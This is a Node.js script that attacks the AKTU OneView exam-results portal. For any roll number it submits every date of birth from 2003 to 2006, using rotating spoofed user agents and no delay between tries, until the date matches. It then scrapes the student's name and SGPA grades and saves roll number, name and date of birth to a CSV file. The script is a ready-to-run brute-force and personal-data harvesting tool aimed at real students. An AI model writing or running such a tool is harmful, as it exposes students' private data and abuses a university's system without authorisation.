const axios = require('axios');
const qs = require('qs');
const cheerio = require('cheerio');
const fs = require('fs');


const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
];

function readExistingEntries(filename) {
    try {
        const data = fs.readFileSync(filename, 'utf8');
        const entries = {};
        data.split('\n').forEach(line => {
            const [rollNumber, name, dob] = line.split(',');
            if (rollNumber) {
                entries[rollNumber] = { name, dob };
            }
        });
        return entries;
    } catch (error) {
        // If file doesn't exist or can't be read, return an empty object
        return {};
    }
}

async function find(rollnumber, day, month, year) {


    function getRandomUserAgent() {
        return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    const userAgent = getRandomUserAgent();
    const data = qs.stringify({
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__VIEWSTATE': '/wEPDwULLTExMDg0MzM4NTIPZBYCAgMPZBYEAgMPZBYEAgkPDxYCHgdWaXNpYmxlaGRkAgsPDxYCHwBnZBYCAgEPDxYCHwBnZBYCAgMPDxYCHgdFbmFibGVkZ2RkAgkPZBYCAgEPZBYCZg9kFgICAQ88KwARAgEQFgAWABYADBQrAABkGAEFEmdyZFZpZXdDb25mbGljdGlvbg9nZI39oJgydt1DpqkTbfYVCIehpm4TLMtdl7PeRLzN+5Jy',
        '__VIEWSTATEGENERATOR': 'FF2D60E4',
        '__EVENTVALIDATION': '/wEdAAbVARScphHwmjwD865sI1EeWB/t8XsfPbhKtaDxBSD9Lx25Lt8Vu4DZSHACA6NZjXuO1N1XNFmfsMXJasjxX85jSqX/wPN6qcfKF0mMYn5Pzrqic3S0ZDjCzqE9M2ZhdeRT68jJfo8Qy8cvEUD7m7ars0BV+cLKRjL8DPXKB3128Q==',
        'txtRollNo': rollnumber,
        'txtDOB': `${String(day).padStart(2, '0')}/${String(month).padStart(2, '0')}/${year}`,
        'btnSearch': 'खोजें',
        'hidForModel': ''
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://oneview.aktu.ac.in/WebPages/aktu/OneView.aspx',
        headers: {
            'DNT': '1',
            'Origin': 'https://oneview.aktu.ac.in',
            'Referer': 'https://oneview.aktu.ac.in/WebPages/aktu/OneView.aspx',
            'User-Agent': userAgent,
        },
        data: data
    };

    try {
        const response = await axios.request(config);
        const parseData = parseHtml(response.data);
        if (parseData && parseData.success) {
            // Log successful roll number and date to file
            logToFile(`${rollnumber},${day}/${month}/${year}\n`, 'successful_results.csv');
        }
        return parseData;
    } catch (error) {
        console.error('Error in find function:', error);
        return null;
    }
}

function parseHtml(htmlContent) {
    let sgpaValues = [];
    const $ = cheerio.load(htmlContent);
    const applicationNumber = $('#lblRollNo').text().trim() || 'N/A';
    const name = $('#lblFullName').text().trim() || 'N/A';
    const COP = $('#ctl04_lblCOP').text().trim() || 'N/A';

    $('td > span:contains("SGPA")').each((index, element) => {
        const sgpaValue = $(element).parent().next('td').next('td').find('span').text().trim();
        sgpaValues.push(sgpaValue);
    });

    if (applicationNumber === 'N/A' && name === 'N/A' && sgpaValues.length === 0) {
        return null;
    }

    const result = {
        applicationNumber,
        name,
        COP,
        sgpaValues
    };

    return result;
}

function readExistingEntries(filename) {
    try {
        const data = fs.readFileSync(filename, 'utf8');
        const entries = {};
        data.split('\n').forEach(line => {
            const [rollNumber, name, dob] = line.split(',');
            if (rollNumber) {
                entries[rollNumber] = { name, dob };
            }
        });
        return entries;
    } catch (error) {
        return {};
    }
}

function logToFile(data, filename) {
    const existingEntries = readExistingEntries(filename);
    const [rollNumber, name, dob] = data.split(',');

    if (!existingEntries[rollNumber]) {
        fs.appendFileSync(filename, data);
        console.log(`Data appended to ${filename}`);
    } else {
        console.log(`Roll number ${rollNumber} already exists in the file. Skipping.`);
    }
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function getDaysInMonth(month, year) {
    return new Date(year, month, 0).getDate();
}

async function processRollNumber(rollnumber, filename) {
    console.log(`Processing roll number: ${rollnumber}`);
    const existingEntries = readExistingEntries(filename);

    if (existingEntries[rollnumber]) {
        console.log('Found entry in file:');
        console.log({
            applicationNumber: rollnumber,
            name: existingEntries[rollnumber].name,
            dob: existingEntries[rollnumber].dob
        });
        return existingEntries[rollnumber];
    }

    for (let year = 2003; year <= 2006; year++) {
        for (let month = 1; month <= 12; month++) {
            const daysInMonth = getDaysInMonth(month, year);
            for (let day = 1; day <= daysInMonth; day++) {
                console.log(`Trying date: ${day}/${month}/${year}`);
                try {
                    const result = await find(rollnumber, day, month, year);
                    if (result) {
                        console.log('Found result from AKTU website:');
                        console.log(result);
                        const dob = `${String(day).padStart(2, '0')}/${String(month).padStart(2, '0')}/${year}`;
                        logToFile(`${result.applicationNumber},${result.name},${dob}\n`, filename);
                        return { ...result, dob };
                    }
                } catch (error) {
                    console.error('Error in execution:', error);
                }
                // await delay(100); // 1 second delay between requests
            }
        }
    }
    
    console.log(`No result found for roll number ${rollnumber}`);
    return null;
}

async function main(rollNumbers) {
    const filename = 'successful_results.csv';
    const results = [];

    for (const rollNumber of rollNumbers) {
        const result = await processRollNumber(rollNumber, filename);
        results.push({ rollNumber, result });
        await delay(5000); // 5 seconds delay between processing different roll numbers
    }

    console.log('Final results:');
    console.log(results);
}

// Example usage
const rollNumbersToSearch = ["ENTER ROLL NUMBER HERE"];
main(rollNumbersToSearch);




// main("2200910200041");
